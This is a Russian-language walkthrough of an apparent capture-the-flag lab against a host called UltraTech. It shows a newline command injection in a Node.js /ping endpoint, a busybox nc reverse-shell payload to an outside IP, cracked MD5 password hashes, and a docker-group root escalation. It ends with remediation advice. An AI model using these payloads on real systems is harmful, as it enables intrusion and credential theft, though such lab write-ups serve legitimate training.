# Отчёт о проникновении в инфраструктуру UltraTech

## 1. Введение

В рамках задания проводилось тестирование на проникновение инфраструктуры компании UltraTech. По условию, это **grey-box**-оценка: изначально известны только **название компании** и **IP-адрес сервера**. Цель — получить максимальный доступ к инфраструктуре, включая root.

В отчёте последовательно описаны **все этапы работы**, включая удачные и неудачные попытки, с пояснениями, почему был выбран тот или иной вектор.


## 2. Первичная разведка (Nmap)

Сканирование целевого хоста `10.129.141.175` выявило три открытых порта:

```
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux)
| ssh-hostkey:
|   3072 11:7e:52:4f:dc:1e:c9:7f:c2:b6:19:1c:de:1c:16:66 (RSA)
|   256 1b:5f:f0:e9:77:26:01:e1:6b:23:29:ca:09:60:ee:b0 (ECDSA)
|_  256 38:6e:11:3d:5a:29:f2:19:17:5d:10:af:08:29:20:d0 (ED25519)
8081/tcp open  http    Node.js Express framework
```

**Вывод:**

- **21** — FTP (vsftpd 3.0.5).
- **22** — SSH (OpenSSH 8.2p1, Ubuntu).
- **8081** — HTTP (Node.js Express).


## 3. Проверка FTP

### 3.1. Анонимный доступ

**Анонимный доступ** с пустым паролем **недоступен**.

**Вывод:** нужно **искать креды** и **повторить** проверку.


## 4. Исследование порта 8081

### 4.1. Главная страница API

На порту 8081 обнаружен **UltraTech API v0.1.3**.

**Фаззинг директорий и файлов** выявил:

```
auth    (Status: 200) [Size: 39]  — "you must specify a login and a password"
ping    (Status: 500)
```

### 4.2. Попытка авторизации

Попытка использовать **рандомные креды**:

```
?login=test&password=test
```

**Ответ:** `invalid credentials`.

### 4.3. Эксплуатация `/auth`

**Проверенные векторы:**

- **SQLi** — **нет**.
- **NoSQLi** — **нет**.
- **Command Injection** — **нет**.


## 5. Исследование и эксплуатация страницы `/ping`

### 5.1. Ошибка без параметра

**Запрос** `/ping` **без параметра** вернул **JavaScript-ошибку**:

```
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

**Вывод:** требуется **какой-то параметр** — без него **ошибка JS**.


## 6. Ответы на вопросы задания

### 6.1. Which software is using the port 8081?

**Ответ:** **node.js**.

### 6.2. Which other non-standard port is used?

**Ответ:** **31331** (Status: 200, Size: 6092).

### 6.3. Which software using this port?

**Ответ:** **apache http server 2.4.41**.

### 6.4. Which GNU/Linux distribution seems to be used?

**Ответ:** **ubuntu**.

### 6.5. The software using the port 8081 is a REST api, how many of its routes are used by the web application?

**Ответ:** **2** (маршруты `/auth` и `/ping`).


## 7. Исследование веб-приложения на порту 31331

### 7.1. Robots.txt и sitemap

**Запрос** `/robots.txt`:

```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

**Sitemap** указывает на `/utech_sitemap.txt`.

### 7.2. Страница `/partners`

На странице `/partners` обнаружена **форма авторизации**:

```html
<div class="auth__auth">
    <h1 class="auth__title">Private Partners Area</h1>
    <p>Fill in your login and password</p>
    <form method='GET' autocompelete="new-password" role="presentation" class="form">
        <label>Login</label>
        <input type="text" name="login" id='email' placeholder="your login">
        <label>Password</label>
        <input type="password" name="password" id='password' placeholder="●●●●●●●●●" autocomplete="off">
        <button type='submit' class="button button__accent">Log in</button>
        <a href=""><h6 class="left-align">Forgot your password?</h6></a>
    </form>
</div>
```

**При отправке** запроса — **редирект** на:

```
http://10.129.141.175:8081/auth?login=test&password=test
```

**Обнаружена почта:** `ultratech@yopmail.com`.

### 7.3. Файл `api.js`

В файле `api.js` обнаружен **нужный параметр** для запроса `/ping`:

```javascript
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
        return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
        const req = new XMLHttpRequest();
        try {
            const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
            req.open('GET', url, true);
            req.onload = function (e) {
                if (req.readyState === 4) {
                    if (req.status === 200) {
                        console.log('The api seems to be running')
                    } else {
                        console.error(req.statusText);
                    }
                }
            };
            req.onerror = function (e) {
                console.error(xhr.statusText);
            };
            req.send(null);
        }
        catch (e) {
            console.error(e)
            console.log('API Error');
        }
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
```

**Параметр `ip`** — **нужен** для `/ping`.

### 7.4. Проверка `/ping?ip=127.0.0.1`

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
```

**Вывод:** `/ping` **выполняет** **системную** **команду** `ping` **с** **параметром** `ip`.


## 8. Эксплуатация Command Injection

### 8.1. Проверка инъекции

**Запрос** `127.0.0.1%0Aid`:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
uid=1002(www) gid=1002(www) groups=1002(www)
```

**Вывод:** **Command Injection** **работает**. **`%0A`** — **перевод** **строки**, **позволяет** **выполнить** **вторую** **команду**.

### 8.2. Reverse Shell

**Запрос** `/ping?ip=127.0.0.1%0Abusybox+nc+192.168.135.182+4444+-e+sh`.

**Получен reverse shell** от пользователя **`www`**.


## 9. Исследование базы данных

### 9.1. Файл базы данных

**Вопрос:** There is a database lying around, what is its filename?

**Ответ:** **`utech.db.sqlite`**.

### 9.2. Содержимое таблицы `users`

```sql
sqlite> select * from users;
```

```
╭───────┬──────────────────────────────────┬──────╮
│ login │             password             │ type │
╞═══════╪══════════════════════════════════╪══════╡
│ admin │ 0d0ea5111e3c1def594c1684e3b9be84 │    0 │
│ r00t  │ f357a0c52799563c7c7b76c1e7543a32 │    0 │
```

### 9.3. Вопросы и ответы

**Вопрос:** What is the first user's password hash?

**Ответ:** **`f357a0c52799563c7c7b76c1e7543a32`** (хеш пользователя `r00t`).

**Вопрос:** What is the password associated with this hash?

**Ответ:** **`n100906`**.


## 10. Эскалация привилегий

### 10.1. Первичный поиск

- **SUID** — **нет**.
- **Файлы с пермишенами** — **не обнаружены**.
- **Крон-задачи** — **нет**.
- **`sudo -l`** — `Sorry, user r00t may not run sudo`.
- **Capabilities** — **нет**.

### 10.2. Переключение на `r00t`

**Использован** **пароль** **`n100906`** **для** **пользователя** **`r00t`**.

### 10.3. Группа `docker`

**Пользователь `r00t`** **состоит** **в** **группе** **`docker`**:

```
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

**Проверка Docker-образов:**

```
REPOSITORY   TAG      IMAGE ID       CREATED       SIZE
bash         latest   495d6437fc1e   7 years ago   15.8MB
```

**Вывод:** на машине **есть** **Docker-образ** **`bash`**.

### 10.4. Privilege Escalation via Docker group

**Команда:**

```bash
docker run -it --rm -v /:/mnt bash chroot /mnt bash
```

**Результат:**

```
id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

**Вывод:** получен **root** на хосте.

**Как это работает:**

1. **Docker-демон** работает от **root** и **монтирует** **`/`** хоста в **`/mnt`** контейнера.
2. **`chroot /mnt`** меняет корень на **хостовую ФС**.
3. **`bash`** запускает **shell** с **доступом** к **хосту** от **root**.


## 11. Получение приватного SSH-ключа root

### 11.1. Вопрос

**What are the first 9 characters of the root user's private SSH key?**

### 11.2. Получение ключа

```bash
head -1 id_rsa
```

**Результат:**

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
```

**Первые 9 символов:**
**`MIIEogIBA`**.

## 12. Цепочка атаки

1. **Nmap** → порты 21, 22, 8081.
2. **FTP** → анонимный доступ **недоступен**.
3. **Порт 8081** → API с маршрутами `/auth` и `/ping`.
4. **`/ping`** → **Command Injection** через параметр `ip`.
5. **Reverse shell** → пользователь **`www`**.
6. **База данных** `utech.db.sqlite` → хеши паролей.
7. **Пароль `r00t`** → **`n100906`** (из хеша `f357a0c52799563c7c7b76c1e7543a32`).
8. **Группа `docker`** → **Container Escape** → **root**.
9. **Приватный SSH-ключ root** → **первые 9 символов**.


## 13. Разбор уязвимостей

| Уязвимость | Описание | Влияние |
|---|---|---|
| **Command Injection** | `/ping?ip=` не санитизирует ввод | RCE от `www` |
| **Слабое хранение паролей** | MD5-хеши без соли | Взлом пароля `r00t` |
| **Пользователь в группе `docker`** | `r00t` может запускать контейнеры | Container Escape → root |
| **Docker без ограничений** | `-v /:/mnt` монтирует корень хоста | Полный доступ к хосту |


## 14. Рекомендации по устранению

1. **Санитизировать ввод** в `/ping` — использовать `child_process.execFile` вместо `exec`, whitelist IP.
2. **Хранить пароли** с **bcrypt/argon2**, а не MD5.
3. **Убрать пользователей из группы `docker`** — это эквивалент root.
4. **Ограничить Docker** — использовать rootless Docker, AppArmor/SELinux.
5. **Не монтировать `/` хоста** в контейнеры.


## 15. Заключение

Задание пройдено полностью. Цепочка атаки: **Command Injection → RCE → дамп БД → взлом хеша → пользователь `r00t` → группа `docker` → Privilege Escalation via Docker group → root**. Ключевые ошибки — **Command Injection** в `/ping`, **слабые MD5-хеши** и **пользователь в группе `docker`**, что позволило **выйти из контейнера** и получить **root** на хосте. Все шаги выполнены в логике «как реальный атакующий»: разведка → анализ API → эксплуатация → эскалация → root. Цель достигнута.